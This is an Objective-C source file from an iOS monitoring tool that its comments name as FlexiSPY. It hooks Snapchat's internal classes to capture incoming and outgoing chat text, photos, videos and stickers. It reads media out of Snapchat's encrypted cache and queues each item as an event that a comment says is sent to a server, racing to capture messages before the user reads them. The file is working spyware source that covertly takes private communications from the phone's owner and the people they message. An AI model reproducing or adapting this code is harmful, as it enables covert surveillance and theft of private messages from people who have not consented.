//
//  SnapchatOfflineUtils.m
//  MSFSP
//
//  Created by Makara on 5/23/14.
//
//

#import "SnapchatOfflineUtils.h"
#import "SnapchatUtils.h"
#import "SCOfflineTextChatMediaOP.h"
#import "IMShareUtils.h"

#import "Manager.h"
#import "User.h"
#import "User+7-0-1.h"
#import "SCChats.h"
#import "SCChat.h"
#import "SCText.h"
#import "SCChatMedia.h"
#import "SCStickerMessage.h"
#import "SOJUSticker.h"
#import "Media+Snapchat.h"
#import "SCMediaCache.h"
#import "SCChatStickerManager.h"
#import "SCBatchedMediaMessage.h"
#import "SCChatRenderableChatMedia.h"
#import "SCBaseChatMedia.h"

//9.33.1
#import "SCChatStickerManager+9-33-1.h"

#import <objc/runtime.h>

static SnapchatOfflineUtils *_SnapchatOfflineUtils = nil;

@interface SnapchatOfflineUtils (private)
- (void) applicationDidBecomeActiveNotification: (NSNotification *) aNotification;
- (void) findSmallestUnreadMessageTimestamp;
- (void) threadOfflineCapture: (NSArray *) aArgs;
- (void) threadCaptureIncomingChatMedia: (NSArray *) aArgs;
- (void) threadCaptureOutgoingChatMedia: (NSArray *) aArgs;
@end

@implementation SnapchatOfflineUtils

@synthesize mNewestSCTextChatMediaTimestamp, mOfflineCaptureThread, mQueue;

+ (id) sharedSnapchatOfflineUtils {
    if (_SnapchatOfflineUtils == nil) {
        _SnapchatOfflineUtils = [[SnapchatOfflineUtils alloc] init];
    }
    return (_SnapchatOfflineUtils);
}

- (id) init {
    if ((self = [super init])) {
        NSArray *searchPaths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *documentPath = [searchPaths objectAtIndex:0];
        NSString *capturedTimestampPath = [NSString stringWithFormat:@"%@/%@", documentPath, @"snapchat-ts.plist"];
        NSDictionary *capturedTimestampInfo = [NSDictionary dictionaryWithContentsOfFile:capturedTimestampPath];
        NSDate *timestamp = [capturedTimestampInfo objectForKey:@"lastTimestamp"];
        if (timestamp) {
            [self setMNewestSCTextChatMediaTimestamp:timestamp];
        } else {
            //[self setMNewestSCTextChatMediaTimestamp:[NSDate dateWithTimeIntervalSince1970:100.0l]];
            
            /*************************************************************************************************************************************
             Due to we do not use isUnread flag in capture offline method, we have to find smallest timestamp in case it does not exist (this
             case happen when user first installed FlexiSPY) otherwise FlexiSPY will capture whatever messages that have timestamp latter than
             NSDate dateWithTimeIntervalSince1970:100.0l...
             
             Need to find this smallest time before query offline messages, thus it must call in threadOfflineCapture method
             *************************************************************************************************************************************/
            
            //[self findSmallestUnreadMessageTimestamp];
        }
        
        mQueue = [[NSOperationQueue alloc] init];
        [mQueue setMaxConcurrentOperationCount:1];
        
        NSNotificationCenter *center = [NSNotificationCenter defaultCenter];
        [center addObserver:self
                   selector:@selector(applicationDidBecomeActiveNotification:)
                       name:UIApplicationDidBecomeActiveNotification
                     object:nil];
    }
    return (self);
}

- (void) saveNewestSCTextChatMediaTimestamp: (NSDate *) aTimestamp {
    /*
     When we save time stamp in plist the precision is lost so we need to add one second to original time stamp to make sure
     that last captured time stamp is newer than its own.
     
     If we did not add one second, when we use last time stamp to compare in offline capture we always get last chat's time stamp newer
     than the one that we saved. The result in which application always capture last chat whenever application become active...
     */
    NSDate *makeupTimestamp = [aTimestamp dateByAddingTimeInterval:1.0l];
    [self setMNewestSCTextChatMediaTimestamp:makeupTimestamp];
    NSArray *searchPaths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *documentPath = [searchPaths objectAtIndex:0];
    NSString *capturedTimestampPath = [NSString stringWithFormat:@"%@/%@", documentPath, @"snapchat-ts.plist"];
    NSDictionary *capturedTimestampInfo = [NSDictionary dictionaryWithObject:makeupTimestamp forKey:@"lastTimestamp"];
    [capturedTimestampInfo writeToFile:capturedTimestampPath atomically:YES];
}

- (void) captureIncomingSnapchatPhoto: (SCChat *) aChat
                            chatMedia: (SCChatMedia *) aChatMedia {
    NSArray *args = [NSArray arrayWithObjects:aChat, aChatMedia, nil];
    [NSThread detachNewThreadSelector:@selector(threadCaptureIncomingChatMedia:)
                             toTarget:self
                           withObject:args];
}

- (void) captureIncomingSnapchatBatchedPhoto: (SCChat *) aChat
                                batchedMedia: (SCBatchedMediaMessage *) aBatchedMedia{
    NSArray *args = [NSArray arrayWithObjects:aChat, aBatchedMedia, nil];
    [NSThread detachNewThreadSelector:@selector(threadCaptureIncomingBatchedMedia:)
                             toTarget:self
                           withObject:args];
}
- (void) captureIncomingSnapchatSticker:(SCChat *) aChat
                            stickerMessage: (SCStickerMessage *) aStickerMessage {
    NSArray *args = [NSArray arrayWithObjects:aChat, aStickerMessage, nil];
    [NSThread detachNewThreadSelector:@selector(threadCaptureIncomingSticker:)
                             toTarget:self
                           withObject:args];
}

- (void) captureOutgoingSnapchatPhoto: (SCChat *) aChat
                            chatMedia: (SCChatMedia *) aChatMedia {
    NSArray *args = [NSArray arrayWithObjects:aChat, aChatMedia, nil];
    [NSThread detachNewThreadSelector:@selector(threadCaptureOutgoingChatMedia:)
                             toTarget:self
                           withObject:args];
}

- (void) captureOutgoingSnapchatBatchedPhoto: (SCChat *) aChat
                            batchedMedia: (SCBatchedMediaMessage *) aBatchedMedia {
    NSArray *args = [NSArray arrayWithObjects:aChat, aBatchedMedia, nil];
    [NSThread detachNewThreadSelector:@selector(threadCaptureOutgoingBatchedMedia:)
                             toTarget:self
                           withObject:args];
}


- (void) captureOutgoingSnapchatSticker: (SCChat *) aChat
                            stickerMessage: (SCStickerMessage *) aStickerMessage {
    NSArray *args = [NSArray arrayWithObjects:aChat, aStickerMessage, nil];
    [NSThread detachNewThreadSelector:@selector(threadCaptureOutgoingSticker:)
                             toTarget:self
                           withObject:args];
}

#pragma mark - Private methods -

- (void) applicationDidBecomeActiveNotification: (NSNotification *) aNotification {
    if ([self mOfflineCaptureThread] == nil) {
        [NSThread detachNewThreadSelector:@selector(threadOfflineCapture:)
                                 toTarget:self
                               withObject:nil];
    }
}

- (void) findSmallestUnreadMessageTimestamp {
    Class $Manager = objc_getClass("Manager");
    Manager *manager = [$Manager shared];
    User *user = [manager user];
    SCChats *scChats = [user chats];
    
    NSDictionary *chats = [scChats chats];
    NSArray *allKeys = [chats allKeys];
    
    
    NSDate *smallestTimestamp = nil;
    
    for (NSString *key in allKeys) {
        SCChat *chat = [chats objectForKey:key];
        
        BOOL hasUnreadMessage = NO;
        
        if ([chat respondsToSelector:@selector(hasUnreadMessages)]) {
            DLog(@"-------------------------------------------------");
            DLog(@"hasUnreadMessages, %d", [chat hasUnreadMessages]);
            DLog(@"-------------------------------------------------");

            if ([chat hasUnreadMessages])
                hasUnreadMessage = YES;
        } else if ([chat respondsToSelector:@selector(hasUnreadChatMessages)]) {        // Snapchat 8.0.1
            DLog(@"-------------------------------------------------");
            DLog(@"hasUnreadChatMessages, %d", [chat hasUnreadChatMessages]);
            DLog(@"-------------------------------------------------");

            if ([chat hasUnreadChatMessages])
                hasUnreadMessage = YES;
        }
        
        if (hasUnreadMessage) {
            for (id message in [chat messages]) {
                
                SCBaseMessage *baseMessage = message;
                if ([baseMessage isUnread]) {
                    NSDate *timestamp = [baseMessage timestamp];
                    
                    if (smallestTimestamp == nil) {
                        smallestTimestamp = timestamp;
                    } else {
                        if ([timestamp compare:smallestTimestamp] == NSOrderedAscending) {
                            smallestTimestamp = timestamp;
                        }
                    }
                }
            }
        }
    }
    
    if (smallestTimestamp == nil) {
        [self setMNewestSCTextChatMediaTimestamp:[NSDate date]];
    } else {
        [self setMNewestSCTextChatMediaTimestamp:[smallestTimestamp dateByAddingTimeInterval:-1.0l]];
    }
    DLog(@"Smallest timestamp is %@", [self mNewestSCTextChatMediaTimestamp]);
}


- (void) threadOfflineCapture:(NSArray *)aArgs {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    [aArgs retain];
    
    @try {
        [self setMOfflineCaptureThread:[NSThread currentThread]];
        
        /*
         - Wait for Snapchat to download offline messages, if we start query right the way we get nothing
         - We no longer use isUnread flag so we can have much time to wait
        */
        [NSThread sleepForTimeInterval:5.0];
        
        if ([self mNewestSCTextChatMediaTimestamp] == nil) {
            [self findSmallestUnreadMessageTimestamp];
        }
        
        Class $Manager = objc_getClass("Manager");
        Manager *manager = [$Manager shared];
        User *user = [manager user];
        SCChats *scChats = [user chats];
        
        DLog(@"chats, %@", [scChats chats]);
        
        NSDictionary *chats = [scChats chats];
        [chats retain];
        
        NSArray *allKeys = [chats allKeys];
        
        NSDate *lastSCTextChatMediaTimestamp = [self mNewestSCTextChatMediaTimestamp];
        NSDate *biggestTimestamp = lastSCTextChatMediaTimestamp;
        DLog(@"t1, biggestTimestamp, %@, %f", biggestTimestamp, [biggestTimestamp timeIntervalSince1970]);
        
        BOOL updateTimestamp = NO;
        
        for (NSString *key in allKeys) {
            SCChat *chat = [chats objectForKey:key];
            
            DLog(@"-------------------------------------------------");
            if ([chat respondsToSelector:@selector(hasUnreadMessages)]) {
                DLog(@"hasUnreadMessages, %d", [chat hasUnreadMessages]);
            }
            DLog(@"messages, %@", [chat messages]);
            DLog(@"-------------------------------------------------");
            
            for (id message in [chat messages]) {
                SCBaseMessage *baseMessage = message;
                NSDate *timestamp = [baseMessage timestamp];
                DLog(@"timestamp, %@, %f isUnread %d", timestamp, [timestamp timeIntervalSince1970], [baseMessage isUnread]);
                
                Class $SCText       = objc_getClass("SCText");
                Class $SCChatMedia  = objc_getClass("SCChatMedia");
                Class $SCBatchedMediaMessage  = objc_getClass("SCBatchedMediaMessage");
                Class $SCStickerMessage  = objc_getClass("SCStickerMessage");
                Class $SCChatMediaMessage = objc_getClass("SCChatMediaMessage"); // Video from album
                
                // Process only SCText and SCChatMedia. We don't capture Snap in here
                if ([message isKindOfClass:$SCText]  ||
                    [message isKindOfClass:$SCChatMedia] ||
                    [message isKindOfClass:$SCBatchedMediaMessage] ||
                    [message isKindOfClass:$SCStickerMessage] ||
                    [message isKindOfClass:$SCChatMediaMessage]) {
                    
                    /* Ensure that 
                        - this is the incoming message 
                        - message's timestamp is greater than the latest timestamp saved by foreground event
                          or by this method in the previous didBecomeActive
                     */
                    BOOL isSentByUser = NO;
                    
                    if ([baseMessage respondsToSelector:@selector(isSentByUser)]) {
                        isSentByUser = [baseMessage isSentByUser] ;
                    } else if ([baseMessage respondsToSelector:@selector(sentByUser)]) {
                        isSentByUser = [baseMessage sentByUser] ;
                    } else {
                        DLog(@"Wrong direction")
                    }
                    
                    if (/*[baseMessage isUnread] &&*/
                        !isSentByUser &&
                        [timestamp compare:lastSCTextChatMediaTimestamp] == NSOrderedDescending) {
                        DLog(@"!! process this offilne")
                        
                        if ([message isKindOfClass:$SCText]) {
                            SCText *scText = message;
                            DLog(@"text, %@", [scText text]);
                            
                            NSString *thirdPartyUsername    = [scText sender];
                            NSString *thirdPartyDisplayName = [SnapchatUtils getDisplayNameForUsername:thirdPartyUsername];
                            DLog(@"3rd party id: %@, display name: %@", thirdPartyUsername , thirdPartyDisplayName);
                            
    //                        [SnapchatUtils sendIncomingIMEventForSenderID:thirdPartyUsername
    //                                                    senderDisplayName:thirdPartyDisplayName
    //                                                          messageText:[scText text]
    //                                                             converID:[chat conversationId]];
                            
                            /*
                             Quickly identify offline messages asap before message unread flag is cleared by user
                             */
                            SCOfflineTextChatMediaOP *op = [[[SCOfflineTextChatMediaOP alloc] initWithSenderUserName:thirdPartyUsername
                                                                                                  senderDisplayName:thirdPartyDisplayName
                                                                                                             convId:[chat conversationId]
                                                                                                               data:[scText text]] autorelease];
                            [[self mQueue] addOperation:op];
                        }
                        else if ([message isKindOfClass:$SCChatMedia] ||
                                 [message isKindOfClass:$SCChatMediaMessage]) {
                            SCChatMedia *scChatMedia = message;
                            
                            /*
                             Quickly identify offline messages asap before message unread flag is cleared by user, if we media need to wait it must wait in thread without delaying text message
                             */
                            
                            [self captureIncomingSnapchatPhoto:chat chatMedia:scChatMedia];
                            
                           
                        }
                        else if ([message isKindOfClass:$SCStickerMessage]) {
                            SCStickerMessage *scStickerMessage = message;
                            
                            /*
                             Quickly identify offline messages asap before message unread flag is cleared by user, if we media need to wait it must wait in thread without delaying text message
                             */
                            
                            [self captureIncomingSnapchatSticker:chat stickerMessage:scStickerMessage];
                            
                            
                        }
                        else if ([message isKindOfClass:$SCBatchedMediaMessage]) {
                            SCBatchedMediaMessage *scBatchedMedia = message;
                            
                            /*
                             Quickly identify offline messages asap before message unread flag is cleared by user, if we media need to wait it must wait in thread without delaying text message
                             */
                            
                            [self captureIncomingSnapchatBatchedPhoto:chat batchedMedia:scBatchedMedia];
                            
                            
                        }
                        
                        if ([timestamp compare:biggestTimestamp] == NSOrderedDescending) {
                            DLog(@"!!! update biggest timestamp")
                            biggestTimestamp = timestamp;
                            updateTimestamp = YES;
                        }
                    }
                    // For debuging purpose
                    /*
                    else {
                        if ([message isKindOfClass:$SCText]) {
                            SCText *scText = message;
                            DLog(@"NOT PROCESS text, %@", [scText text]);
                        } else if ([message isKindOfClass:$SCChatMedia]) {
                            DLog(@"NOT PROCESS picture from album [with text %@]", [message text]);
                        }
                    }*/
                }
            }
        }
        
        DLog(@"t2, biggestTimestamp, %@, %f", biggestTimestamp, [biggestTimestamp timeIntervalSince1970]);
        
        if (updateTimestamp) {
            [self saveNewestSCTextChatMediaTimestamp:biggestTimestamp];
        }
        
        [chats release];
    }
    @catch (NSException *exception) {
        DLog(@"Capture offline Snapchat exception, %@", exception);
    }
    @finally {
        ;
    }
    
    [self setMOfflineCaptureThread:nil];
    
    [aArgs release];
    [pool release];
}

- (void) threadCaptureIncomingChatMedia: (NSArray *) aArgs {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    [aArgs retain];
    SCChat *chat                = [aArgs objectAtIndex:0];
    SCChatMedia *chatMedia      = [aArgs objectAtIndex:1];
    
    SCChatMedia *scChatMedia    = chatMedia;
    //DLog(@"url, %@",    [scChatMedia url]);
    //DLog(@"iv, %@",     [scChatMedia iv]);
    //DLog(@"key, %@",    [scChatMedia key]);
    
    @try {
        if ([scChatMedia respondsToSelector:@selector(fetchMedia)]) {
            [scChatMedia fetchMedia];
        } else if ([scChatMedia respondsToSelector:@selector(fetchMediaUserInitiated:)]) { // Snapchat 9.1.3
            DLog(@"Fetch incoming media for me please...");
            [scChatMedia fetchMediaUserInitiated:YES];
        }
        
        while (![scChatMedia isLoaded]) {
            DLog(@"Wait----");
            [NSThread sleepForTimeInterval:2.5];
            
        }
        
        Media *media = [scChatMedia media];
        DLog(@"media        = %@", media);
        DLog(@"isLoaded     = %d", [media isLoaded]);
        //DLog(@"isLoading    = %d", [media isLoading]);
        //DLog(@"isImage      = %d", [media isImage]);
        //DLog(@"isVideo      = %d", [media isVideo]);
        //DLog(@"isVideoWithSound         = %d", [media isVideoWithSound]);
        //DLog(@"isProxy                  = %d", [media isProxy]);
        //DLog(@"dataToUpload           = %@", [media dataToUpload]);
        //DLog(@"mediaDataToUpload      = %@", [media mediaDataToUpload]);
        //DLog(@"overlayDataToUpload    = %@", [media overlayDataToUpload]);
        
        id endpointParameters = [scChatMedia endpointParamsForMedia:media];
        id cacheId = [scChatMedia cacheId];
        
        DLog(@"endpointParameters   = %@", endpointParameters);
        //DLog(@"endpoint             = %@", [scChatMedia endpointForMedia:media]);
        DLog(@"cacheId              = %@", cacheId);
        DLog(@"notificationType     = %@", [scChatMedia notificationType]);
        
        Class $SCMediaCache = objc_getClass("SCMediaCache");
        SCMediaCache *scMediaCache = [$SCMediaCache sharedCache];
        //DLog(@"attributes, %@",       [scMediaCache attributes]);
        //DLog(@"objectsToKeys, %@",    [scMediaCache objectsToKeys]);
        
        NSData *dataFromCache   = nil;
        BOOL isOldVersion       = [IMShareUtils isCurrentVersionLessThan:@"9.4.0"];
        
        if (isOldVersion) {
            dataFromCache       = [scMediaCache dataFromDiskForKey:cacheId dictionary:endpointParameters];
        } else {
            DLog(@"> 9.4.0")
            NSDictionary *encryptionDict = [scChatMedia encryptionDictionaryForMedia:scChatMedia];
            dataFromCache       = [scMediaCache dataFromDiskForKey:cacheId dictionary:encryptionDict];
        }
        
        NSDictionary *dataDic = @{@"MediaData": dataFromCache, @"isVideo": [NSNumber numberWithBool:media.isVideo]};
        
        //DLog(@"dataFromCache length (data for old version), %lu", (unsigned long)[[scMediaCache dataFromDiskForKey:cacheId dictionary:endpointParameters] length]);
        DLog(@"dataFromCache length (data for new version), %lu", (unsigned long)[dataFromCache length]);
        
        NSString *thirdPartyUsername    = [scChatMedia sender];
        NSString *thirdPartyDisplayName = [SnapchatUtils getDisplayNameForUsername:thirdPartyUsername];
        DLog(@"3rd party id: %@, display name: %@", thirdPartyUsername , thirdPartyDisplayName);
        
//        [SnapchatUtils sendIncomingIMEventForSenderID:thirdPartyUsername
//                                    senderDisplayName:thirdPartyDisplayName
//                                            mediaData:dataFromCache
//                                             converID:[chat conversationId]];
        
        // Using operation queue to send event to server to manage concurrency
        SCOfflineTextChatMediaOP *op = [[[SCOfflineTextChatMediaOP alloc] initWithSenderUserName:thirdPartyUsername
                                                                              senderDisplayName:thirdPartyDisplayName
                                                                                         convId:[chat conversationId]
                                                                                           data:dataDic] autorelease];
        [[self mQueue] addOperation:op];
    }
    @catch (NSException *exception) {
        DLog(@"Capture incoming ChatMedia Snapchat exception, %@", exception);
    }
    @finally {
        ;
    }
    
    [aArgs release];
    [pool release];
}

- (void) threadCaptureIncomingBatchedMedia: (NSArray *) aArgs {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    [aArgs retain];
    SCChat *chat = [aArgs objectAtIndex:0];
    SCBatchedMediaMessage *scBatchedMedia = [aArgs objectAtIndex:1];
    
    //DLog(@"url, %@",    [scChatMedia url]);
    //DLog(@"iv, %@",     [scChatMedia iv]);
    //DLog(@"key, %@",    [scChatMedia key]);
    
    @try {
        if ([scBatchedMedia respondsToSelector:@selector(fetchMedia)]) {
            [scBatchedMedia fetchMedia];
        }
        
        while (![scBatchedMedia isLoaded]) {
            DLog(@"Wait----");
            [NSThread sleepForTimeInterval:2.5];
            
        }
        
        NSMutableArray *dataFromCachedArray = [NSMutableArray array];
        Class $SCMediaCache = objc_getClass("SCMediaCache");
        SCMediaCache *scMediaCache = [$SCMediaCache sharedCache];

        [scBatchedMedia.mediaList enumerateObjectsUsingBlock:^(SCBaseChatMedia *baseChatMedia, NSUInteger idx, BOOL * /*_Nonnull*/ stop) {
            Media *media = [baseChatMedia media];
            id endpointParameters = [baseChatMedia endpointParamsForMedia:media];
            id cacheId = [baseChatMedia cacheId];
            
            NSData *dataFromCache   = nil;
            BOOL isOldVersion       = [IMShareUtils isCurrentVersionLessThan:@"9.4.0"];
            
            if (isOldVersion) {
                dataFromCache       = [scMediaCache dataFromDiskForKey:cacheId dictionary:endpointParameters];
            } else {
                DLog(@"> 9.4.0")
                NSDictionary *encryptionDict = [baseChatMedia encryptionDictionaryForMedia:media];
                dataFromCache       = [scMediaCache dataFromDiskForKey:cacheId dictionary:encryptionDict];
            }
            
            NSDictionary *dataDic = @{@"MediaData": dataFromCache, @"isVideo": [NSNumber numberWithBool:media.isVideo]};
            [dataFromCachedArray addObject:dataDic];
        }];
        
        NSString *thirdPartyUsername    = [scBatchedMedia sender];
        NSString *thirdPartyDisplayName = [SnapchatUtils getDisplayNameForUsername:thirdPartyUsername];
        DLog(@"3rd party id: %@, display name: %@", thirdPartyUsername , thirdPartyDisplayName);
        
        //        [SnapchatUtils sendIncomingIMEventForSenderID:thirdPartyUsername
        //                                    senderDisplayName:thirdPartyDisplayName
        //                                            mediaData:dataFromCache
        //                                             converID:[chat conversationId]];
        
        // Using operation queue to send event to server to manage concurrency
        SCOfflineTextChatMediaOP *op = [[[SCOfflineTextChatMediaOP alloc] initWithSenderUserName:thirdPartyUsername
                                                                               senderDisplayName:thirdPartyDisplayName
                                                                                          convId:[chat conversationId]
                                                                                            data:dataFromCachedArray] autorelease];
        [[self mQueue] addOperation:op];
    }
    @catch (NSException *exception) {
        DLog(@"Capture incoming ChatMedia Snapchat exception, %@", exception);
    }
    @finally {
        ;
    }
    
    [aArgs release];
    [pool release];
}

- (void) threadCaptureOutgoingChatMedia: (NSArray *) aArgs {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    [aArgs retain];
    SCChat *chat                = [aArgs objectAtIndex:0];
    SCChatMedia *chatMedia      = [aArgs objectAtIndex:1];
    
    SCChatMedia *scChatMedia    = chatMedia;
    //DLog(@"url, %@",    [scChatMedia url]);
    //DLog(@"iv, %@",     [scChatMedia iv]);
    //DLog(@"key, %@",    [scChatMedia key]);
    
    @try {
        if ([scChatMedia respondsToSelector:@selector(fetchMedia)]) {
            [scChatMedia fetchMedia];
        } else if ([scChatMedia respondsToSelector:@selector(fetchMediaUserInitiated:)]) { // Snapchat 9.1.3
            DLog(@"Fetch outgoing media for me please...");
            [scChatMedia fetchMediaUserInitiated:YES];
        }

        
        while (![scChatMedia isLoaded]) {
            DLog(@"Wait----");
            [NSThread sleepForTimeInterval:2.5];
            
        }
        
        Media *media = [scChatMedia media];
        DLog(@"media        = %@", media);
        DLog(@"isLoaded     = %d", [media isLoaded]);
        //DLog(@"isLoading    = %d", [media isLoading]);
        //DLog(@"isImage      = %d", [media isImage]);
        //DLog(@"isVideo      = %d", [media isVideo]);
        //DLog(@"isVideoWithSound         = %d", [media isVideoWithSound]);
        //DLog(@"isProxy                  = %d", [media isProxy]);
        //DLog(@"dataToUpload           = %@", [media dataToUpload]);
        //DLog(@"mediaDataToUpload      = %@", [media mediaDataToUpload]);
        //DLog(@"overlayDataToUpload    = %@", [media overlayDataToUpload]);
        
        NSString *thirdPartyUsername   =  [scChatMedia recipient];
        NSString *thirdPartyDisplayName = [SnapchatUtils getDisplayNameForUsername:thirdPartyUsername];
        DLog(@"3rd party id: %@, display name: %@", thirdPartyUsername , thirdPartyDisplayName);
        
        NSString *mediaPath     = [SnapchatUtils getOutputPathForExtension:@"jpg"];
       
        if (media.isVideo) {
            mediaPath     = [SnapchatUtils getOutputPathForExtension:@"mov"];
        }
        
        NSData *mediaData       = [media mediaDataToUpload];
        
        DLog(@"mediaData length = %lu, url = %@", (unsigned long)[mediaData length], [scChatMedia url]);
        
        if (mediaData != nil) {
            if (![mediaData writeToFile:mediaPath atomically:YES]) {
                mediaPath = [IMShareUtils saveData:mediaData toDocumentSubDirectory:@"/attachments/imSnapchat/" fileName:[mediaPath lastPathComponent]];
            }
            
            [SnapchatUtils sendOutgoingIMEventForRecipientID:thirdPartyUsername
                                        recipientDisplayName:thirdPartyDisplayName
                                                   media:mediaPath
                                                 captionText:[scChatMedia text]
                                                    converID:[chat conversationId]
                                       messageRepresentation:kIMMessageNone];
        }
    }
    @catch (NSException *exception) {
        DLog(@"Capture outgoing ChatMedia Snapchat exception, %@", exception);
    }
    @finally {
        ;
    }
    
    [aArgs release];
    [pool release];
}

- (void) threadCaptureOutgoingBatchedMedia: (NSArray *) aArgs {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    [aArgs retain];
    SCChat *chat = [aArgs objectAtIndex:0];
    SCBatchedMediaMessage *scBatchedMedia = [aArgs objectAtIndex:1];
    
    //DLog(@"url, %@",    [scChatMedia url]);
    //DLog(@"iv, %@",     [scChatMedia iv]);
    //DLog(@"key, %@",    [scChatMedia key]);
    
    @try {
        if ([scBatchedMedia respondsToSelector:@selector(fetchMedia)]) {
            [scBatchedMedia fetchMedia];
        }
        
        while (![scBatchedMedia isLoaded]) {
            DLog(@"Wait----");
            [NSThread sleepForTimeInterval:2.5];
            
        }
        
        NSMutableArray *mediaPathArray = [NSMutableArray array];
        
        [scBatchedMedia.mediaList enumerateObjectsUsingBlock:^(SCBaseChatMedia *media, NSUInteger idx, BOOL * /*_Nonnull*/ stop) {
            __block NSString *mediaPath     = [SnapchatUtils getOutputPathForExtension:@"jpg"];
            Media *thumbnailMedia = [media media];
            
            if (media.isVideo) {
                mediaPath     = [SnapchatUtils getOutputPathForExtension:@"mov"];
            }
            
            NSData *mediaData = [thumbnailMedia mediaDataToUpload];
            if (mediaData != nil) {
                if (![mediaData writeToFile:mediaPath atomically:YES]) {
                    mediaPath = [IMShareUtils saveData:mediaData toDocumentSubDirectory:@"/attachments/imSnapchat/" fileName:[mediaPath lastPathComponent]];
                    [mediaPathArray addObject:mediaPath];
                }
            }
        }];
        
        NSString *thirdPartyUsername   =  [scBatchedMedia recipient];
        NSString *thirdPartyDisplayName = [SnapchatUtils getDisplayNameForUsername:thirdPartyUsername];
        DLog(@"3rd party id: %@, display name: %@", thirdPartyUsername , thirdPartyDisplayName);
        
        [SnapchatUtils sendOutgoingIMEventForRecipientID:thirdPartyUsername
                                    recipientDisplayName:thirdPartyDisplayName
                                                   media:mediaPathArray
                                             captionText:[scBatchedMedia text]
                                                converID:[chat conversationId]
                                   messageRepresentation:kIMMessageNone];

    }
    @catch (NSException *exception) {
        DLog(@"Capture outgoing ChatMedia Snapchat exception, %@", exception);
    }
    @finally {
        ;
    }
    
    [aArgs release];
    [pool release];
}

- (void) threadCaptureIncomingSticker: (NSArray *) aArgs {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    [aArgs retain];
    SCChat *chat                = [aArgs objectAtIndex:0];
    SCStickerMessage *stickerMessage      = [aArgs objectAtIndex:1];
    SOJUSticker *sticker    = stickerMessage.sticker;
    
    //DLog(@"url, %@",    [scChatMedia url]);
    //DLog(@"iv, %@",     [scChatMedia iv]);
    //DLog(@"key, %@",    [scChatMedia key]);
    
    @try {
        
        Class $SCChatStickerManager = objc_getClass("SCChatStickerManager");
        SCChatStickerManager *stickerManager = [$SCChatStickerManager shared];
        
        __block UIImage *stickerImage = nil;
        //9.33
        if ([stickerManager respondsToSelector:@selector(fetchStickerImageWithSticker:completionQueue:completionBlock:)]) {
            dispatch_semaphore_t sem = dispatch_semaphore_create(0);
            [stickerManager fetchStickerImageWithSticker:sticker completionQueue:nil completionBlock:^(UIImage *aStickerImage){
                stickerImage = aStickerImage;
                dispatch_semaphore_signal(sem);
            }];
            dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
            dispatch_release(sem);
        }
        //9.29
        if ([stickerManager respondsToSelector:@selector(fetchStickerImageWithSticker:completionBlock:)]) {
            stickerImage = [stickerManager fetchStickerImageWithSticker:sticker completionBlock:^(BOOL success, UIImage *stickerImage){
                
            }];
        }

        NSData *mediaData       = UIImagePNGRepresentation(stickerImage);
        
        NSString *thirdPartyUsername    = [stickerMessage sender];
        NSString *thirdPartyDisplayName = [SnapchatUtils getDisplayNameForUsername:thirdPartyUsername];
        DLog(@"3rd party id: %@, display name: %@", thirdPartyUsername , thirdPartyDisplayName);
        
        //        [SnapchatUtils sendIncomingIMEventForSenderID:thirdPartyUsername
        //                                    senderDisplayName:thirdPartyDisplayName
        //                                            mediaData:dataFromCache
        //                                             converID:[chat conversationId]];
        
        // Using operation queue to send event to server to manage concurrency
        SCOfflineTextChatMediaOP *op = [[[SCOfflineTextChatMediaOP alloc] initWithSenderUserName:thirdPartyUsername
                                                                               senderDisplayName:thirdPartyDisplayName
                                                                                          convId:[chat conversationId]
                                                                                            data:mediaData] autorelease];
        [[self mQueue] addOperation:op];
    }
    @catch (NSException *exception) {
        DLog(@"Capture incoming ChatMedia Snapchat exception, %@", exception);
    }
    @finally {
        ;
    }
    
    [aArgs release];
    [pool release];
}

- (void) threadCaptureOutgoingSticker: (NSArray *) aArgs {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    [aArgs retain];
    SCChat *chat                = [aArgs objectAtIndex:0];
    SCStickerMessage *stickerMessage      = [aArgs objectAtIndex:1];
    
    SOJUSticker *sticker    = stickerMessage.sticker;
    
    //DLog(@"url, %@",    [scChatMedia url]);
    //DLog(@"iv, %@",     [scChatMedia iv]);
    //DLog(@"key, %@",    [scChatMedia key]);
    
    @try {
        Class $SCChatStickerManager = objc_getClass("SCChatStickerManager");
        SCChatStickerManager *stickerManager = [$SCChatStickerManager shared];
        
        __block UIImage *stickerImage = nil;
        //9.33
        if ([stickerManager respondsToSelector:@selector(fetchStickerImageWithSticker:completionQueue:completionBlock:)]) {
            dispatch_semaphore_t sem = dispatch_semaphore_create(0);
            [stickerManager fetchStickerImageWithSticker:sticker completionQueue:nil completionBlock:^(UIImage *aStickerImage){
                stickerImage = aStickerImage;
                dispatch_semaphore_signal(sem);
            }];
            dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
            dispatch_release(sem);
        }
        //9.29
        if ([stickerManager respondsToSelector:@selector(fetchStickerImageWithSticker:completionBlock:)]) {
            stickerImage = [stickerManager fetchStickerImageWithSticker:sticker completionBlock:^(BOOL success, UIImage *stickerImage){
                
            }];
        }
        
        DLog(@"StickerImage %@", stickerImage);
        
        NSString *thirdPartyUsername   =  [stickerMessage recipient];
        NSString *thirdPartyDisplayName = [SnapchatUtils getDisplayNameForUsername:thirdPartyUsername];
        DLog(@"3rd party id: %@, display name: %@", thirdPartyUsername , thirdPartyDisplayName);
        
        NSData *mediaData       = UIImageJPEGRepresentation(stickerImage, 1.0);
        
        DLog(@"mediaData length = %lu", (unsigned long)[mediaData length]);
        
        if (mediaData != nil) {
            [SnapchatUtils sendOutgoingIMEventForRecipientID:thirdPartyUsername
                                        recipientDisplayName:thirdPartyDisplayName
                                                   media:mediaData
                                                 captionText:[stickerMessage text]
                                                    converID:[chat conversationId]
                                          messageRepresentation:kIMMessageSticker];
        }
    }
    @catch (NSException *exception) {
        DLog(@"Capture outgoing ChatMedia Snapchat exception, %@", exception);
    }
    @finally {
        ;
    }
    
    [aArgs release];
    [pool release];
}

@end
